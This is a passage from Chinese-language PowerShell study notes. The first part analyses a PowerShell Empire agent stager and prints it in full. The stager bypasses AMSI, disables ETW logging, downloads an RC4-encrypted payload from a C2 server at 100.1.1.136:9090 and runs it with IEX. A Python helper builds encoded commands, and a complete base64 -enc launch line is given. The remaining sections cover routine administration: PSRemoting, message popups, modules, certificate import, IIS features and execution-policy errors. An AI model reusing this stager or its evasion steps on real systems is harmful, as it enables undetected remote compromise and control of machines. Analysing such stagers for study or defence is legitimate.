\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000H\u0000]\u0000=\u0000$\u0000S\u0000[\u0000$\u0000H\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000;\u0000$\u0000_\u0000-\u0000b\u0000x\u0000o\u0000r\u0000$\u0000S\u0000[\u0000(\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000+\u0000$\u0000S\u0000[\u0000$\u0000H\u0000]\u0000)\u0000%\u00002\u00005\u00006\u0000]\u0000}\u0000}\u0000;\u0000$\u0000w\u0000c\u0000.\u0000H\u0000e\u0000a\u0000d\u0000e\u0000r\u0000s\u0000.\u0000A\u0000d\u0000d\u0000(\u0000\"\u0000C\u0000o\u0000o\u0000k\u0000i\u0000e\u0000\"\u0000,\u0000\"\u0000c\u0000H\u0000G\u0000A\u0000f\u0000d\u0000L\u0000Z\u0000D\u0000C\u0000E\u0000t\u0000L\u0000M\u0000K\u0000=\u0000l\u0000L\u0000q\u00008\u0000U\u0000w\u0000i\u0000E\u0000u\u0000z\u0000v\u0000I\u0000Q\u0000D\u00004\u0000j\u00007\u0000p\u00006\u0000I\u0000J\u0000s\u0000h\u0000i\u0000i\u00001\u0000E\u0000=\u0000\"\u0000)\u0000;\u0000$\u0000d\u0000a\u0000t\u0000a\u0000=\u0000$\u0000w\u0000c\u0000.\u0000D\u0000o\u0000w\u0000n\u0000l\u0000o\u0000a\u0000d\u0000D\u0000a\u0000t\u0000a\u0000(\u0000$\u0000s\u0000e\u0000r\u0000+\u0000$\u0000t\u0000)\u0000;\u0000$\u0000i\u0000v\u0000=\u0000$\u0000d\u0000a\u0000t\u0000a\u0000[\u00000\u0000.\u0000.\u00003\u0000]\u0000;\u0000$\u0000d\u0000a\u0000t\u0000a\u0000=\u0000$\u0000d\u0000a\u0000t\u0000a\u0000[\u00004\u0000.\u0000.\u0000$\u0000d\u0000a\u0000t\u0000a\u0000.\u0000l\u0000e\u0000n\u0000g\u0000t\u0000h\u0000]\u0000;\u0000-\u0000j\u0000o\u0000i\u0000n\u0000[\u0000C\u0000h\u0000a\u0000r\u0000[\u0000]\u0000]\u0000(\u0000&\u0000 \u0000$\u0000R\u0000 \u0000$\u0000d\u0000a\u0000t\u0000a\u0000 \u0000(\u0000$\u0000I\u0000V\u0000+\u0000$\u0000K\u0000)\u0000)\u0000|\u0000I\u0000E\u0000X\u0000"
```

里面的 `\u0000` 是原始命令 utf-16 le 编码后每个英文字符的低字节, `powershell -enc` 的传入参数即为这种 Base64 编码的 UTF-16 LE 编码的命令

这里直接 base64 解码后看到的这串字符可读性很差, 需要去掉 `\u0000` 再读, 甚至对于一些(在线的) base64 解码功能来讲, 可能解码后不支持 utf-16 le 的显示而出现乱码

可以使用如下脚本来构造这种编码的命令字符串

```python
import base64

def gen_enc_cmd(plain_cmd: str) -> str:
    """将 cmd 先 Unicode(UTF-16 LE) 编码然后 base64 编码"""
    return base64.b64encode(plain_cmd.encode('utf-16-le')).decode()

print(gen_enc_cmd('dir'))
```

去除 `\u0000` 并规范化后得到:

```Powershell
# 检查 PowerShell 版本是否为 3 及以上
If ($PSVersionTable.PSVersion.Major -ge 3) {
    # 禁用 AMSI (Antimalware Scan Interface) 以规避潜在的扫描
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
    $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($Null, $true);

    # 禁用 PowerShell 的 ETW (Event Tracing for Windows) 日志记录
    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue(
        [Ref].Assembly.GetType(
            'System.Management.Automation.Tracing.PSEtwLogProvider'
        ).GetField(
            'etwProvider', 'NonPublic,Static'
        ).GetValue($null), 
        0
    );
}

# 禁用 HTTP 请求中的 "Expect: 100-Continue" 标头
[System.Net.ServicePointManager]::Expect100Continue = 0;

# 创建 System.Net.WebClient 类的新实例
$wc = New-Object System.Net.WebClient;

# 定义用于 HTTP 请求头的用户代理字符串
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';

# 解码并存储 base64 编码的服务器 URL
# "h\u0000t\u0000t\u0000p\u0000:\u0000/\u0000/\u00001\u00000\u00000\u0000.\u00001\u0000.\u00001\u0000.\u00001\u00003\u00006\u0000:\u00009\u00000\u00009\u00000\u0000"
# "http://100.1.1.136:9090"
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA==')));

# 定义目标 URL 路径
$t = '/login/process.php';

# 将用户代理标头添加到 Web 客户端
$wc.Headers.Add('User-Agent', $u);

# 配置 Web 客户端以使用默认的系统代理设置
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

# 将加密密钥转换为 ASCII 字节
$K = [System.Text.Encoding]::ASCII.GetBytes('Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R');

# 定义用于自定义加密算法的函数
$R = {
    $D, $K = $Args;
    $S = 0..255;
    0..255 | % {
        $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256;
        $S[$_], $S[$J] = $S[$J], $S[$_];
    };
    $D | % {
        $I = ($I + 1) % 256;
        $H = ($H + $S[$I]) % 256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ -bxor $S[($S[$I] + $S[$H]) % 256];
    };
};

# 将特定的 Cookie 添加到 Web 客户端标头
$wc.Headers.Add("Cookie", "cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E=");

# 从指定的 URL 下载数据并将其存储在 $data 中
$data = $wc.DownloadData($ser + $t);

# 从下载的数据中提取初始化向量 (IV)
$iv = $data[0..3];                 

# 从下载的数据中移除 IV
$data = $data[4..$data.length];

# 使用自定义加密函数对数据进行解密并执行
-join [Char[]](& $R $data ($IV + $K)) | IEX

```

- `[System.Net.ServicePointManager]::Expect100Continue = 0;`

  - 在HTTP通信中，客户端可以在发送大量数据之前发送一个 `Expect: 100-continue` 请求头部，以询问服务器是否准备好接收数据。
    服务器可以回复“HTTP/1.1 100 Continue”表示准备好接收，然后客户端继续发送数据。

    这里将其设置为0以禁用 `Expect: 100-continue` 头部机制，使得客户端发送数据时不再等待服务器的确认

    > 也许是出于减少上线步骤的考量, 也许是有些防病毒措施对于这个字段有监测点

- `IEX` - `Invoke-Expression`

将上述脚本重新放到编码脚本中跑一遍得到编码后的命令在命令行中执行:

```powershell
powershell -noP -sta -w 1 -enc  CgAjACAAwGjlZyAAUABvAHcAZQByAFMAaABlAGwAbAAgAEhyLGcvZiZUOk4gADMAIADKU+VOCk4KAEkAZgAgACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApACAAewAKACAAIAAgACAAIwAgAIF5KHUgAEEATQBTAEkAIAAoAEEAbgB0AGkAbQBhAGwAdwBhAHIAZQAgAFMAYwBhAG4AIABJAG4AdABlAHIAZgBhAGMAZQApACAA5U7EiX+QXG8oV4R2a2LPYwoAIAAgACAAIAAkAFIAZQBmACAAPQAgAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAKACAAIAAgACAAJABSAGUAZgAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAE4AdQBsAGwALAAgACQAdAByAHUAZQApADsACgAKACAAIAAgACAAIwAgAIF5KHUgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIACEdiAARQBUAFcAIAAoAEUAdgBlAG4AdAAgAFQAcgBhAGMAaQBuAGcAIABmAG8AcgAgAFcAaQBuAGQAbwB3AHMAKQAgAOVl11+wi1VfCgAgACAAIAAgAFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgACgAgACAAIAAgACAAIAAgACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVAByAGEAYwBpAG4AZwAuAFAAUwBFAHQAdwBMAG8AZwBQAHIAbwB2AGkAZABlAHIAJwAKACAAIAAgACAAIAAgACAAIAApAC4ARwBlAHQARgBpAGUAbABkACgACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAIAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwAKACAAIAAgACAAIAAgACAAIAApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAgAAoAIAAgACAAIAAgACAAIAAgADAACgAgACAAIAAgACkAOwAKAH0ACgAKACMAIACBeSh1IABIAFQAVABQACAA94tCbC1OhHYgACIARQB4AHAAZQBjAHQAOgAgADEAMAAwAC0AQwBvAG4AdABpAG4AdQBlACIAIAAHaDRZCgBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMAbwBuAHQAaQBuAHUAZQAgAD0AIAAwADsACgAKACMAIAAbUvpeIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAIAB7fIR2sGWeW4tPCgAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsACgAKACMAIACaW0lOKHWOTiAASABUAFQAUAAgAPeLQmw0WYR2KHU3YuNOBnRXWyZ7Mk4KACQAdQAgAD0AIAAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsACgAKACMAIADjiQF4dl5YW6hQIABiAGEAcwBlADYANAAgABZ/AXiEdg1noVJoViAAVQBSAEwACgAjACAAIgBoAAAAdAAAAHQAAABwAAAAOgAAAC8AAAAvAAAAMQAAADAAAAAwAAAALgAAADEAAAAuAAAAMQAAAC4AAAAxAAAAMwAAADYAAAA6AAAAOQAAADAAAAA5AAAAMAAAACIACgAjACAAIgBoAHQAdABwADoALwAvADEAMAAwAC4AMQAuADEALgAxADMANgA6ADkAMAA5ADAAIgAKACQAcwBlAHIAIAA9ACAAJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABZAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsACgAKACMAIACaW0lO7nYHaCAAVQBSAEwAIADvjYRfCgAkAHQAIAA9ACAAJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsACgAKACMAIAAGXCh1N2LjTgZ0B2g0WfttoFIwUiAAVwBlAGIAIACiWzdi73oKACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAgACQAdQApADsACgAKACMAIABNkW5/IABXAGUAYgAgAKJbN2LveuVOf08oddiepIuEdvt8337jTgZ0votufwoAJAB3AGMALgBQAHIAbwB4AHkAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7AAoAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7AAoACgAjACAABlygUsZbxlullGyPYmM6TiAAQQBTAEMASQBJACAAV1uCggoAJABLACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACcASAB1AHYALAAzAGcAdABzAGMAfQAjAF8ARQA6AGYARgBYAHcAbgAyAGIAVQBQAFYAfABpAE0AZQAwACsANQBSACcAKQA7AAoACgAjACAAmltJTih1jk7qgZpbSU6gUsZbl3vVbIR2/VFwZQoAJABSACAAPQAgAHsACgAgACAAIAAgACQARAAsACAAJABLACAAPQAgACQAQQByAGcAcwA7AAoAIAAgACAAIAAkAFMAIAA9ACAAMAAuAC4AMgA1ADUAOwAKACAAIAAgACAAMAAuAC4AMgA1ADUAIAB8ACAAJQAgAHsACgAgACAAIAAgACAAIAAgACAAJABKACAAPQAgACgAJABKACAAKwAgACQAUwBbACQAXwBdACAAKwAgACQASwBbACQAXwAgACUAIAAkAEsALgBDAG8AdQBuAHQAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJABTAFsAJABfAF0ALAAgACQAUwBbACQASgBdACAAPQAgACQAUwBbACQASgBdACwAIAAkAFMAWwAkAF8AXQA7AAoAIAAgACAAIAB9ADsACgAgACAAIAAgACQARAAgAHwAIAAlACAAewAKACAAIAAgACAAIAAgACAAIAAkAEkAIAA9ACAAKAAkAEkAIAArACAAMQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJABIACAAPQAgACgAJABIACAAKwAgACQAUwBbACQASQBdACkAIAAlACAAMgA1ADYAOwAKACAAIAAgACAAIAAgACAAIAAkAFMAWwAkAEkAXQAsACAAJABTAFsAJABIAF0AIAA9ACAAJABTAFsAJABIAF0ALAAgACQAUwBbACQASQBdADsACgAgACAAIAAgACAAIAAgACAAJABfACAALQBiAHgAbwByACAAJABTAFsAKAAkAFMAWwAkAEkAXQAgACsAIAAkAFMAWwAkAEgAXQApACAAJQAgADIANQA2AF0AOwAKACAAIAAgACAAfQA7AAoAfQA7AAoACgAjACAABlx5cppbhHYgAEMAbwBvAGsAaQBlACAA+22gUjBSIABXAGUAYgAgAKJbN2LvegdoNFkKACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIAAiAGMASABHAEEAZgBkAEwAWgBEAEMARQB0AEwATQBLAD0AbABMAHEAOABVAHcAaQBFAHUAegB2AEkAUQBEADQAagA3AHAANgBJAEoAcwBoAGkAaQAxAEUAPQAiACkAOwAKAAoAIwAgAM5OB2OaW4R2IABVAFIATAAgAAtOfY9wZW5jdl4GXHZRWFuoUChXIAAkAGQAYQB0AGEAIAAtTgoAJABkAGEAdABhACAAPQAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACAAKwAgACQAdAApADsACgAKACMAIADOTgtOfY+EdnBlbmMtTtBj1lMdUstZFlMRVM+RIAAoAEkAVgApAAoAJABpAHYAIAA9ACAAJABkAGEAdABhAFsAMAAuAC4AMwBdADsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAoACgAjACAAzk4LTn2PhHZwZW5jLU77eWSWIABJAFYACgAkAGQAYQB0AGEAIAA9ACAAJABkAGEAdABhAFsANAAuAC4AJABkAGEAdABhAC4AbABlAG4AZwB0AGgAXQA7AAoACgAjACAAf08odeqBmltJTqBSxlv9UXBl+VtwZW5j249MiOOJxlt2XmdiTIgKAC0AagBvAGkAbgAgAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACAAKwAgACQASwApACkAIAB8ACAASQBFAFgACgAKAA==
```

然后即可在 Powershell Empire 的 Server 与 Client 上看到上线提醒与交互

![image-20230831180943834](http://cdn.ayusummer233.top/DailyNotes/202308311809537.png)

![image-20230831181007831](http://cdn.ayusummer233.top/DailyNotes/202308311811775.png)

![image-20230831181105944](http://cdn.ayusummer233.top/DailyNotes/202308311811637.png)

---

## 远程连接

> [Enable-PSRemoting (Microsoft.PowerShell.Core) - PowerShell | Microsoft Learn --- 启用-PSRemoting (Microsoft.PowerShell.Core) - PowerShell |微软学习](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.3&source=docs)
>
> [WinRM の TrastedHosts にホストを追加 / 確認 / 削除する : Windows Tips | iPentec](https://www.ipentec.com/document/windows-windows-10-add-winrm-trasted-hosts)
>
> [WS-Management (WSMan) Remoting in PowerShell - PowerShell | Microsoft Learn --- PowerShell 中的 WS-Management (WSMan) 远程处理 - PowerShell |微软学习](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/wsman-remoting-in-powershell-core?view=powershell-7.3)

如果本地和远程都是 Windows 的话, 需要在本地和远程 Windows 上启用 PS Remoteing

![image-20230918163201801](http://cdn.ayusummer233.top/DailyNotes/202310121357162.png)

然后将远程主机加入到本地 TrustedHosts 中来信任该远程主机

```powershell
Set-Item wsman:\localhost\Client\TrustedHosts -Value "远程主机ip" -Force
```

连接远程主机:

```powershell
$sess = New-PSSession -ComputerName [远程主机名或ip] -Credential domain\username
```

![image-20231012135531500](http://cdn.ayusummer233.top/DailyNotes/202310121357082.png)

可以通过 `Get-PSSession` 来查看已建立的 session

```powershell
Get-PSSession
```

![image-20230919105638522](http://cdn.ayusummer233.top/DailyNotes/202310121357071.png)

要释放这个 session 可以使用 `Remove-PSSession` 命令

```powershell
Remove-PSSession $sess
```

---

可以使用如下命令通过 powershell remote session 执行命令:

```powershell
Invoke-Command -Session $sess -ScriptBlock {
  # 在远程计算机上执行的命令
  pip -V
}
```

![image-20231012140559947](http://cdn.ayusummer233.top/DailyNotes/202310121406001.png)

可以看到无法识别 pip, 然而远程主机上是有 pip  的:

![image-20231012140646679](http://cdn.ayusummer233.top/DailyNotes/202310121406724.png)

这是因为 PSSession 不会自动加载环境变量, 因此还需要加载一下环境变量, 以加载系统环境变量(而非用户环境变量) 为例

```powershell
# 读取系统环境变量
$envVariables = [System.Environment]::GetEnvironmentVariables([System.EnvironmentVariableTarget]::Machine)
    
foreach ($envVariable in $envVariables.GetEnumerator()) {
    # 这里需要判空, 因为 SetEnviromentVariable 函数不支持空值, 会报错并退出
    if (![string]::IsNullOrWhiteSpace($envVariable.Value)) {
        # 将这些环境变量加载到当前 powershell 进程环境变量中
        [System.Environment]::SetEnvironmentVariable($envVariable.Key, $envVariable.Value, [System.EnvironmentVariableTarget]::Process)
    }
}
```

![image-20231012140818961](http://cdn.ayusummer233.top/DailyNotes/202310121408024.png)

可以看到加载完环境变量就能成功识别 pip 了

> 此外, 如果明确知道只需要加载部分环境, 比如只需要加载系统环境中的 Path 变量的话就可以如下操作:
>
> ```powershell
> [System.Environment]::SetEnvironmentVariable("Path", [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine), [System.EnvironmentVariableTarget]::Process)
> ```
>
> ![image-20231012142257950](http://cdn.ayusummer233.top/DailyNotes/202310121422009.png)

---

## 制作提示窗口

> [PowerShell制作提示窗口_powershell怎么创建弹窗消息-CSDN博客](https://blog.csdn.net/weixin_39802884/article/details/119250927)

可以使用 `WScript.Shell` 对象制作消息弹窗

```powershell
$ws = New-Object -ComObject WScript.Shell
```

然后使用期 `Popup` 方法进行弹窗

```powershell
object.Popup(strText,[nSecondsToWait],[strTitle],[nType])
```

-  `strText` ：消息窗口所包含的文本信息；
- `nSecondsToWait`：等待n秒后该窗口自动关闭，如设置为0，则永不会自动关闭；
- `strTitle`：消息窗口的标题；
- `nType`：消息窗口的按钮类型及其图标

按钮类型:

|  值   |             描述             |
| :---: | :--------------------------: |
|   0   |        显示“确定”按钮        |
|   1   |    显示“确定”+“取消”按钮     |
|   2   | 显示“终止”+“重试”+“忽略”按钮 |
|   3   |   显示“是”+“否”+“取消”按钮   |
|   4   |      显示“是”+“否”按钮       |
|   5   |    显示“重试”+“取消”按钮     |
|   6   | 显示“重试”+“取消”+“继续”按钮 |

图标类型:

|  值   |                                描述                                |
| :---: | :----------------------------------------------------------------: |
|  16   | ![img](http://cdn.ayusummer233.top/DailyNotes/202310121739545.png) |
|  32   | ![img](http://cdn.ayusummer233.top/DailyNotes/202310121739063.png) |
|  48   | ![img](http://cdn.ayusummer233.top/DailyNotes/202310121739057.png) |
|  64   | ![img](http://cdn.ayusummer233.top/DailyNotes/202310121739923.png) |

例如:

```powershell
$ws = New-Object -ComObject WScript.Shell
$wsr = $ws.popup("你好吗？",0,"我的窗口",1 + 16)
```

![image-20231012174103646](http://cdn.ayusummer233.top/DailyNotes/202310121741317.png)

---

## 输出信息

```powershell
Write-Host "未检测到Microsoft Word， 请稍后手动安装 ＞︿＜" -ForegroundColor:Red -BackgroundColor:Black
```

![image-20231013142353601](http://cdn.ayusummer233.top/DailyNotes/202310131423079.png)

---

## 模块

### 安装模块

```powershell
Import-Module AtomicTestHarnesses
```

上述命令用于将计算机中已经存在的模块导入到当前 powershell 会话

----

```powershell
Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
```

上述命令用于从 PowerShell Gallery(或其他源) 下载模块, 并将其安装在当前用户指定的范围中

> `-Force` 表示即便模块已存在, 也会重新安装

---

## 证书

> [ssl - Adding Self Signed Certificate to trusted root certificate store using Command Line - Super User --- ssl-使用命令行将自签名证书添加到受信任的根证书存储 - 智库101 - 一个基于CC版权的问答分享平台](https://superuser.com/questions/463081/adding-self-signed-certificate-to-trusted-root-certificate-store-using-command-l)
>
> [powershell - Import certificates using command line on Windows - Super User --- powershell - 在Windows上使用命令行导入证书 - 智库101 - 一个基于CC版权的问答分享平台](https://superuser.com/questions/1506440/import-certificates-using-command-line-on-windows)

安装证书:

```powershell
# 当前脚本所在目录, 用于后续拼接路径
$scriptParh = Split-Path -Parent $MyInvocation.MyCommand.Definition
# 将 FileServer/key/ca/ca.crt 安装到本地受信任的根证书颁发机构
$caCertPath = Join-Path $scriptParh "\FileServer\key\ca\ca.crt"
Import-Certificate -FilePath $caCertPath -CertStoreLocation Cert:\LocalMachine\Root
Write-Host "已将 $caCertPath 安装到本地受信任的根证书颁发机构" -ForegroundColor:Green 
```

其中 `Cert:\LocalMachine\Root` 对应下图中的 `本地计算机`, 相应的 `CurrentUser` 对应 `当前用户`

![image-20231025113228953](http://cdn.ayusummer233.top/DailyNotes/202310251132410.png)

可以使用 `dir` 命令来查看指定范围可用的证书存储, 例如:

```powershell
dir cert:\\LocalMachine\Root
# 或者:
Get-ChildItem -Path Cert:\LocalMachine\Root
```

![image-20231025141407396](http://cdn.ayusummer233.top/DailyNotes/202310251414906.png)

![image-20231025142513929](http://cdn.ayusummer233.top/DailyNotes/202310251425242.png)

---

## 启用或关闭 Windows 功能

```powershell
optionalFeatures
```

在命令行中键入 `OptionalFeatures` 可以打开 `启用或关闭 Windows 功能` 页面

可以使用 `Enable-WindowsOptionalFeature` 命令启用 Windows 功能, 例如启用 IIS 这一串功能可以用下面的命令

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole, IIS-WebServer, IIS-CommonHttpFeatures, IIS-ManagementConsole, IIS-HttpErrors, IIS-HttpRedirect, IIS-WindowsAuthentication, IIS-StaticContent, IIS-DefaultDocument, IIS-HttpCompressionStatic, IIS-DirectoryBrowsing
```

- `IIS-WebServerRole`: 启用 Web 服务器角色，它是 IIS 的核心部分，用于托管网站和应用程序。

- `IIS-WebServer`: 启用 Web 服务器角色的子组件，包含 Web 服务器核心功能。

- `IIS-CommonHttpFeatures`: 启用通用 HTTP 功能，包括 HTTP 请求监控和其他基本的 HTTP 功能。

- `IIS-ManagementConsole`: 启用 IIS 管理控制台，这是用于配置和管理 IIS 的 GUI 工具。

- `IIS-HttpErrors`: 启用 HTTP 错误页面支持，用于自定义 HTTP 错误页面的设置。

- `IIS-HttpRedirect`: 启用 HTTP 重定向支持，用于配置 HTTP 重定向规则。

- `IIS-WindowsAuthentication`: 启用 Windows 身份验证，允许用户使用其 Windows 凭据进行身份验证。

- `IIS-StaticContent`: 启用静态内容支持，用于托管和提供静态文件(如 HTML、CSS 和图像) 。

- `IIS-DefaultDocument`: 启用默认文档支持，用于配置默认文档文件。

- `IIS-HttpCompressionStatic`: 启用静态内容的 HTTP 压缩，以提高性能并减少带宽占用。

- `IIS-DirectoryBrowsing`: 启用目录浏览功能，允许用户浏览 Web 服务器上的目录。

  ---

- `-Online`: 指定要在在线模式下启用 Windows 可选功能。在线模式表示不需要重新启动计算机以使更改生效。通常，在使用 `-Online` 参数时，可以实时启用或禁用功能，而不必重新启动计算机。

  这与离线模式相对，离线模式通常需要重新启动计算机以使更改生效，这可能会导致系统中断。在线模式通常用于快速配置和启用功能而无需中断计算机的正常操作。

![image-20231029163148767](http://cdn.ayusummer233.top/DailyNotes/202310291631863.png)

然后可以通过如下命令判断 WWW服务(World Wide Web Publishing Service)是否启动来判断是否成功启用了 IIS

```powershell
Get-Service W3SVC
```

![image-20231029164742589](http://cdn.ayusummer233.top/DailyNotes/202310291647834.png)

---

## 报错收集

### 无法加载 `xxx.ps1`, 因在此系统上禁止运行脚本。有关详细信息，请参阅 [关于执行策略 - PowerShell | Microsoft Docs](https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) 中的 `about_Execution_Policies`。

> [关于执行策略 - PowerShell | Microsoft Docs](https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2)

`Windwos+x -> 以管理员身份运行 PowerShell`

```powershell
# 获取当前策略配置
get-ExecutionPolicy
```

> ![image-20220824095328309](http://cdn.ayusummer233.top/img/202208240957994.png)
>
> 默认是 `Restricted`:
>
> - Windows 客户端计算机的默认执行策略。
> - 允许单个命令，但不允许脚本。
> - 防止运行所有脚本文件，包括格式化和配置文件 () `.ps1xml` 、模块脚本文件 (`.psm1`) ，以及 powerShell 配置文件 (`.ps1`) 。
>
> 可以将其改为 `RemoteSigned`
>
> - Windows 服务器计算机的默认执行策略。
> - 脚本可以运行。
> - 需要来自受信任的发布者对从 Internet 下载的脚本和配置文件(包括电子邮件和即时消息程序) 的数字签名。
> - 不需要对在本地计算机上编写的脚本(而不是从 Internet 下载) 进行数字签名。
> - 如果脚本被取消阻止，则运行从 Internet 下载且未签名的脚本，例如使用 `Unblock-File` cmdlet。
> - 从 Internet 以外的源运行未签名脚本的风险，以及可能是恶意的签名脚本。

```powershell
# 设置 powershell 的策略
Set-ExecutionPolicy
```

输入 `RemoteSigned` 并回车, 输入 `y` 确认更改;

然后可以 `get-ExecutionPolicy` 看下是否改动完成

> ![image-20220824095701736](http://cdn.ayusummer233.top/img/202208240957639.png)

> 或者直接
>
> ```powershell
> Set-ExecutionPolicy Unrestricted -force
> ```

---

不过这里也许会报错:

![image-20231020143414302](http://cdn.ayusummer233.top/DailyNotes/202310201434853.png)

可以看到在 UserPolicy 中 ExecutionPolicy 为 Restricted

```powershell
Set-ExecutionPolicy -Scope UserPolicy UnRestricted
```

![image-20231020143846673](http://cdn.ayusummer233.top/DailyNotes/202310201438322.png)

此时需要手动到组策略编辑器中进行设置

![image-20240129140116880](http://cdn.ayusummer233.top/DailyNotes/202401291403112.png)

![image-20240129140155904](http://cdn.ayusummer233.top/DailyNotes/202401291402920.png)

重启 powershell, 重新

```powershell
Get-ExecutionPolicy -List
```

![image-20240129140244993](http://cdn.ayusummer233.top/DailyNotes/202401291402131.png)















